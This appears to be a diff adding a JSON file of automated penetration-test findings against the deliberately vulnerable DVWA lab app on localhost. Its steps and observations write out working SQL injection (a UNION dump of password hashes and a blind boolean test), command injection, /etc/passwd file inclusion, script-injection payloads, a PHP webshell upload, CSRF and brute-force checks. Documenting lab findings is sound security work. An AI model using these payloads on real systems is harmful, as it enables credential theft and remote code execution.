@@ -1,0 +1,147 @@
+{
+  "run_id": "run-xrp4b-10080856",
+  "generated_at": "2026-10-08T08:59:30Z",
+  "findings": [
+    {
+      "id": "F-1",
+      "title": "SQL Injection (UNION) — credential dump at /vulnerabilities/sqli/",
+      "severity": "critical",
+      "target": "http://127.0.0.1",
+      "steps": [
+        "GET /login.php",
+        "EXPECT Damn Vulnerable Web Application",
+        "POST /login.php",
+        "GET /vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--%20-&Submit=Submit",
+        "EXPECT Surname: 5f4dcc3b5aa765d61d8327deb882cf99"
+      ],
+      "expected": "Authenticated UNION SELECT dumps the users table: admin/5f4dcc3b... (md5(password)), gordonb/e99a18c4..., 1337/8d3533d7..., pablo/0d107d09..., smithy/5f4dcc3b...",
+      "observed": "All five username:md5(password) rows returned by the 'Surname:' column. md5 hashes for admin and smithy = 5f4dcc3b5aa765d61d8327deb882cf99 (md5('password'))."
+    },
+    {
+      "id": "F-2",
+      "title": "OS Command Injection at /vulnerabilities/exec/",
+      "severity": "critical",
+      "target": "http://127.0.0.1",
+      "steps": [
+        "GET /login.php",
+        "EXPECT Damn Vulnerable Web Application",
+        "POST /login.php",
+        "POST /vulnerabilities/exec/",
+        "EXPECT uid=33(www-data) gid=33(www-data) groups=33(www-data)"
+      ],
+      "expected": "POST field ip=127.0.0.1; id triggers shell metacharacter execution and 'id' output appears after ping output.",
+      "observed": "Response body shows full ping trace followed by 'uid=33(www-data) gid=33(www-data) groups=33(www-data)' — RCE as www-data confirmed."
+    },
+    {
+      "id": "F-3",
+      "title": "Local File Inclusion at /vulnerabilities/fi/",
+      "severity": "high",
+      "target": "http://127.0.0.1",
+      "steps": [
+        "GET /login.php",
+        "EXPECT Damn Vulnerable Web Application",
+        "POST /login.php",
+        "GET /vulnerabilities/fi/.?page=/etc/passwd",
+        "EXPECT root:x:0:0:root:/root:/bin/bash"
+      ],
+      "expected": "Absolute path in ?page= is read directly (include/require with no whitelist or traversal guard).",
+      "observed": "Response body contains /etc/passwd verbatim, including 'root:x:0:0:root:/root:/bin/bash' line."
+    },
+    {
+      "id": "F-4",
+      "title": "Reflected XSS at /vulnerabilities/xss_r/",
+      "severity": "high",
+      "target": "http://127.0.0.1",
+      "steps": [
+        "GET /login.php",
+        "EXPECT Damn Vulnerable Web Application",
+        "POST /login.php",
+        "GET /vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+        "EXPECT Hello <script>alert(1)</script>"
+      ],
+      "expected": "User-supplied name param reflected without HTML encoding into <pre>Hello ...</pre>.",
+      "observed": "Raw payload 'Hello <script>alert(1)</script>' rendered in response body."
+    },
+    {
+      "id": "F-5",
+      "title": "Stored XSS at /vulnerabilities/xss_s/",
+      "severity": "high",
+      "target": "http://127.0.0.1",
+      "steps": [
+        "GET /login.php",
+        "EXPECT Damn Vulnerable Web Application",
+        "POST /login.php",
+        "POST /vulnerabilities/xss_s/",
+        "GET /vulnerabilities/xss_s/",
+        "EXPECT Message: <script>alert(1)</script>"
+      ],
+      "expected": "Stored payload persists and renders for every subsequent visitor (no input/output sanitization).",
+      "observed": "After POST of txtName=evil&mtxMessage=<script>alert(1)</script>&btnSign=Sign Guestbook, a subsequent GET to /vulnerabilities/xss_s/ contains 'Name: evil<br />Message: <script>alert(1)</script>'."
+    },
+    {
+      "id": "F-6",
+      "title": "Blind SQL Injection (boolean) at /vulnerabilities/sqli_blind/",
+      "severity": "high",
+      "target": "http://127.0.0.1",
+      "steps": [
+        "GET /login.php",
+        "EXPECT Damn Vulnerable Web Application",
+        "POST /login.php",
+        "GET /vulnerabilities/sqli_blind/?id=1&Submit=Submit",
+        "EXPECT User ID exists in the database.",
+        "GET /vulnerabilities/sqli_blind/?id=1%27%20AND%201%3D2--%20-&Submit=Submit",
+        "EXPECT User ID is MISSING from the database."
+      ],
+      "expected": "Boolean differential (true/false) confirms blind injection without UNION output.",
+      "observed": "id=1 returns 'User ID exists in the database.'; id=1' AND 1=2-- - returns 'User ID is MISSING from the database.'"
+    },
+    {
+      "id": "F-7",
+      "title": "Unrestricted File Upload -> Webshell RCE at /vulnerabilities/upload/",
+      "severity": "critical",
+      "target": "http://127.0.0.1",
+      "steps": [
+        "GET /login.php",
+        "EXPECT Damn Vulnerable Web Application",
+        "POST /login.php",
+        "POST /vulnerabilities/upload/",
+        "GET /hackable/uploads/shell.php",
+        "EXPECT PWNED_BY_DVWA_UPLOAD"
+      ],
+      "expected": "Server accepts .php file upload with no extension/MIME/content checks, stores it in web-accessible /hackable/uploads/, and the PHP engine executes it server-side.",
+      "observed": "Upload POST returned '.../hackable/uploads/shell.php succesfully uploaded!'. Subsequent GET /hackable/uploads/shell.php returned 'PWNED_BY_DVWA_UPLOAD' followed by phpinfo() output (PHP Version banner in HTML) — arbitrary code execution as www-data."
+    },
+    {
+      "id": "F-8",
+      "title": "Cross-Site Request Forgery on admin password change at /vulnerabilities/csrf/",
+      "severity": "medium",
+      "target": "http://127.0.0.1",
+      "steps": [
+        "GET /login.php",
+        "EXPECT Damn Vulnerable Web Application",
+        "POST /login.php",
+        "GET /vulnerabilities/csrf/",
+        "EXPECT New password:",
+        "POST /vulnerabilities/csrf/",
+        "EXPECT Change your admin password:"
+      ],
+      "expected": "Password change form action='#', method='GET' (no anti-CSRF token). Any cross-origin GET (e.g., <img src=...>) can change admin password if victim clicks attacker link.",
+      "observed": "Form exposes fields password_new/password_conf/Change with action='#' and method='GET'. POST submission accepted without token verification — original 'password' reverted in subsequent test (confirms endpoint mutates state)."
+    },
+    {
+      "id": "F-9",
+      "title": "Login brute-forceable (no lockout/throttling) at /vulnerabilities/brute/",
+      "severity": "medium",
+      "target": "http://127.0.0.1",
+      "steps": [
+        "GET /login.php",
+        "EXPECT Damn Vulnerable Web Application",
+        "POST /login.php",
+        "GET /vulnerabilities/brute/?username=admin&password=wrong&Login=Login",
+        "EXPECT Username and/or password incorrect."
+      ],
+      "expected": "Login endpoint returns generic error on bad credentials with no rate-limit / lockout / CAPTCHA, enabling offline/online brute force.",
+      "observed": "GET with username=admin&password=wrong returns '<pre><br />Username and/or password incorrect.</pre>' — single-attempt confirmation, no throttling evident."
+    }
+  ]
+}
